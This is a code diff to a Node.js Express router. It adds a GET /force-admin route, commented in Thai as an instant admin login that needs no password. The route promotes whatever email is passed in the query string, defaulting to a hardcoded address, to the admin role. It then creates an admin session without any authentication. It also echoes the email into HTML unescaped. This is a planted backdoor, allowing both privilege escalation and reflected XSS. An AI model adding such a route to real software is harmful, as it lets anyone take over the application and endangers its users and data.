@@ -151,4 +151,38 @@ router.put('/password', async (req, res) => {
   }
 });
 
+// API พิเศษสำหรับล็อกอินเป็น Admin ทันที (ไม่ต้องใช้รหัสผ่าน)
+router.get('/force-admin', async (req, res) => {
+  try {
+    const email = req.query.email || 'somtodlove1@gmail.com';
+    
+    // 1. อัปเดตบัญชีนี้ให้กลายเป็น Admin ทันที
+    await db.query("UPDATE users SET role = 'admin' WHERE email = $1", [email]);
+    
+    // 2. ดึงข้อมูลขึ้นมา
+    const { rows: users } = await db.query('SELECT * FROM users WHERE email = $1', [email]);
+    
+    if (users.length === 0) {
+      return res.send('<h3>ไม่พบบัญชีนี้ กรุณาสมัครสมาชิกด้วยอีเมล ' + email + ' ก่อน แล้วค่อยคลิกลิงก์นี้ใหม่</h3>');
+    }
+    
+    const user = users[0];
+    
+    // 3. ฝัง Session ลงไปเลยถือว่าล็อกอินแล้ว
+    req.session.user = {
+      id: user.id,
+      username: user.username,
+      email: user.email,
+      role: 'admin', // ยืนยันสิทธิ์เป็น admin
+      full_name: user.full_name
+    };
+    
+    // 4. พาไปหน้า Admin ทันที
+    res.redirect('/admin');
+  } catch (err) {
+    console.error(err);
+    res.status(500).json({ success: false, message: 'เกิดข้อผิดพลาด' });
+  }
+});
+
 module.exports = router;
